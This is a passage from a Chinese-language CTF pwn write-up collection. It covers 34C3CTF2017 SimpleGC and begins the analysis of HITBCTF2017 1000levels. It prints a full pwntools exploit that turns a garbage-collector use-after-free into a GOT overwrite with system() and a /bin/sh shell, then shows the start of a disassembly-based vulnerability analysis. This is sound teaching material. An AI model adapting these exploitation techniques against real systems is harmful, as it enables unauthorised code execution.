def overwrite(system_addr):
edit_group(1, "y", p64(system_addr)) # strlen_got -> syst
em_got
def pwn():
add_user("/bin/sh", "B"*4) # system('/bin/sh')
io.interactive()
gdb-peda$ x/gx 0x602030
0x602030: 0x00007ffff7a3fdc0
gdb-peda$ p system
$1 = {} 0x7ffff7a3fdc0 
1142
6.1.15 pwn 34C3CTF2017 SimpleGC
exploit
完整的 exp 如下：
#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
io = process(['./sgc'], env={'LD_PRELOAD':'./libc-2.26.so'})
libc = ELF('libc-2.26.so')
elf = ELF('sgc')
def add_user(name, group):
io.sendlineafter("Action: ", '0')
io.sendlineafter("name: ", name)
io.sendlineafter("group: ", group)
io.sendlineafter("age: ", '3')
def display_group(name):
io.sendlineafter("Action: ", '1')
io.sendlineafter("name: ", name)
def display_user(idx):
io.sendlineafter("Action: ", '2')
io.sendlineafter("index: ", str(idx))
return io.recvuntil("0: ")
def edit_group(idx, propogate, name):
io.sendlineafter("Action: ", '3')
io.sendlineafter("index: ", str(idx))
io.sendlineafter("(y/n): ", propogate)
io.sendlineafter("name: ", name)
def delete_user(idx):
io.sendlineafter("Action: ", '4')
io.sendlineafter("index: ", str(idx))
def overflow():
1143
6.1.15 pwn 34C3CTF2017 SimpleGC
sleep(1)
for i in range(0x100-1):
add_user('a'*8, 'A'*4)
edit_group(0, 'n', 'B'*4)
delete_user(0)
add_user('a'*8, 'A'*4) # overflow ref_count
sleep(2) # group_name and group freed by GC
def leak():
add_user('b'*8, 'B'*4) # group
strlen_got = elf.got['strlen']
edit_group(0, "y", p64(0)+p64(strlen_got)+p64(strlen_got))
__strlen_sse2_addr = u64(display_user(1)[13:19].ljust(8, '\0'
))
libc_base = __strlen_sse2_addr - 0xa83f0
system_addr = libc_base + libc.symbols['system']
log.info("__strlen_sse2 address: 0x%x" % __strlen_sse2_addr)
log.info("libc base: 0x%x" % libc_base)
log.info("system address: 0x%x" % system_addr)
return system_addr
def overwrite(system_addr):
edit_group(1, "y", p64(system_addr)) # strlen_got -> syst
em_got
def pwn():
add_user("/bin/sh\x00", "B"*4) # system('/bin/sh')
io.interactive()
if __name__ == "__main__":
overflow()
system_addr = leak()
overwrite(system_addr)
pwn()
1144
6.1.15 pwn 34C3CTF2017 SimpleGC
虽然这一切看起来都没有问题，但我在运行的时候 system('/bin/sh') 却执行失败
了，应该是我的 /bin/sh 不能使用这个 libc 的原因：
LD_PRELOAD=./libc-2.26.so /bin/sh
[1] 14834 segmentation fault (core dumped) LD_PRELOAD=./libc
-2.26.so /bin/sh
应该换成 Ubuntu-17.10 试试。（本机Arch）
第二种方法，我们利用两个具有同名 group 的 user 释放时的 UAF。这种方法似乎
与 tcache 的关系更大一点。
参考资料
https://ctftime.org/task/5137
https://github.com/bkth/34c3ctf/tree/master/SimpleGC
1145
6.1.16 pwn HITBCTF2017 1000levels
6.1.16 pwn HITBCTF2017 1000levels
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file 1000levels
1000levels: ELF 64-bit LSB shared object, x86-64, version 1 (SYS
V), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 2.6.32, BuildID[sha1]=d0381dfa29216ed7d765936155b
baa3f9501283a, not stripped
$ checksec -f 1000levels
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO No canary found NX enabled PIE enabled
No RPATH No RUNPATH No 0 6 1000leve
ls
$ strings libc-2.23.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu9) stable release versio
n 2.23, by Roland McGrath et al.
Compiled by GNU CC version 5.4.0 20160609.
关闭了 Canary，开启 NX 和 PIE。于是猜测可能是栈溢出，但需要绕过 ASLR。
not stripped 可以说是很开心了。
玩一下：
1146
6.1.16 pwn HITBCTF2017 1000levels
$ ./1000levels
Welcome to 1000levels, it's much more diffcult than before.
1. Go
2. Hint
3. Give up
Choice:
1
How many levels?
0
Coward
Any more?
1
Let's go!'
====================================================
Level 1
Question: 0 * 0 = ? Answer:0
Great job! You finished 1 levels in 1 seconds
Go 的功能看起来就是让你先输入一个数，然后再输入一个数，两个数相加作为
levels，然后让你做算术。
但是很奇怪的是，如果你使用了 Hint 功能，然后第一个数输入了 0 的时候，无论
第二个数是多少，仿佛都会出现无限多的 levels：
1147
6.1.16 pwn HITBCTF2017 1000levels
$ ./1000levels
Welcome to 1000levels, it's much more diffcult than before.
1. Go
2. Hint
3. Give up
Choice:
2
NO PWN NO FUN
1. Go
2. Hint
3. Give up
Choice:
1
How many levels?
0
Coward
Any more?
1
More levels than before!
Let's go!'
====================================================
Level 1
Question: 0 * 0 = ? Answer:0
====================================================
Level 2
Question: 1 * 1 = ? Answer:1
====================================================
Level 3
Question: 1 * 1 = ? Answer:1
====================================================
Level 4
Question: 3 * 1 = ? Answer:
所以应该重点关注一下 Hint 功能。
题目解析
程序比较简单，基本上只有 Go 和 Hint 两个功能。
1148
6.1.16 pwn HITBCTF2017 1000levels
hint
先来看 hint：
[0x000009d0]> pdf @ sym.hint
/ (fcn) sym.hint 140
| sym.hint ();
| ; var int local_110h @ rbp-0x110
| ; CALL XREF from 0x00000fa6 (main)
| 0x00000cf0 push rbp
| 0x00000cf1 mov rbp, rsp
| 0x00000cf4 sub rsp, 0x110
; 开辟栈空间 rsp - 0x110
| 0x00000cfb mov rax, qword [reloc.system]
; [0x201fd0:8]=0
| 0x00000d02 mov qword [local_110h], rax
; 将 system 地址放到栈顶 [local_110h]
| 0x00000d09 lea rax, obj.show_hint
; 0x20208c
| 0x00000d10 mov eax, dword [rax]
; 取出 show_hint
| 0x00000d12 test eax, eax
| ,= 0x00000d41 lea rax, [local_110h]
| | 0x00000d48 add rax, 8
; 将 "NO PWN NO FUN" 复制到 [local_110h+0x8]
1149
6.1.16 pwn HITBCTF2017 1000levels
| | 0x00000d4c movabs rsi, 0x4e204e5750204f4e
| | 0x00000d56 mov qword [rax], rsi
| | 0x00000d59 mov dword [rax + 8], 0x5546204f
; [0x5546204f:4]=-1
| | 0x00000d60 mov word [rax + 0xc], 0x4e
; 'N' ; [0x4e:2]=0
| | ; JMP XREF from 0x00000d3f (sym.hint)
| `--> 0x00000d66 lea rax, [local_110h]
| 0x00000d6d add rax, 8
| 0x00000d71 mov rdi, rax
| 0x00000d74 call sym.imp.puts
; 打印出 [local_110h+0x8]
| 0x00000d79 nop
| 0x00000d7a leave
\ 0x00000d7b ret
[0x000009d0]> ir~system
vaddr=0x00201fd0 paddr=0x00001fd0 type=SET_64 system
[0x000009d0]> is~show_hint
051 0x0000208c 0x0020208c GLOBAL OBJECT 4 show_hint
可以看到 system() 的地址被复制到栈上（ local_110h ），然后对全局变量
show_hint 进行判断，如果为 0，打印字符串 “NO PWN NO FUN”，否则打印
system() 的地址。
为了绕过 ASLR，我们需要信息泄漏，如果能够修改 show_hint ，那我们就可以
得到 system() 的地址。但是 show_hint 放在 .bss 段上，程序开启了
PIE，地址随机无法修改。
go
继续看 go：
[0x000009d0]> pdf @ sym.go
/ (fcn) sym.go 372
| sym.go ();
| ; var int local_120h @ rbp-0x120
| ; var int local_118h @ rbp-0x118
| ; var int local_114h @ rbp-0x114
| ; var int local_110h @ rbp-0x110
1150
6.1.16 pwn HITBCTF2017 1000levels
| ; var int local_108h @ rbp-0x108
| ; CALL XREF from 0x00000f9f (main)
| 0x00000b7c push rbp
| 0x00000b7d mov rbp, rsp
| 0x00000b80 sub rsp, 0x120
; 开辟栈空间 rsp - 0x120
| 0x00000b87 lea rdi, str.How_many_levels
; 0x1094 ; "How many levels?"
| 0x00000b8e call sym.imp.puts
; int puts(const char *s)
| 0x00000b93 call sym.read_num
; ssize_t read(int fildes, void *buf, size_t nbyte)
| 0x00000b98 mov qword [local_120h], rax
; 读入第一个数 num1 放到 [local_120h]
| 0x00000b9f mov rax, qword [local_120h]
| 0x00000ba6 test rax, rax
| ,= 0x00000bb9 mov rax, qword [local_120h]
| | 0x00000bc0 mov qword [local_110h], rax
; num1 放到 [local_110h]
| | ; JMP XREF from 0x00000bb7 (sym.go)
| `--> 0x00000bc7 lea rdi, str.Any_more
; 0x10ac ; "Any more?"
| 0x00000bce call sym.imp.puts
; int puts(const char *s)
| 0x00000bd3 call sym.read_num
; ssize_t read(int fildes, void *buf, size_t nbyte)
| 0x00000bd8 mov qword [local_120h], rax
; 读入第二个数 num2 到 [local_120h]
| 0x00000bdf mov rdx, qword [local_110h]
| 0x00000be6 mov rax, qword [local_120h]
| 0x00000bed add rax, rdx
; 两个数的和 num3 = num1 + num2
1151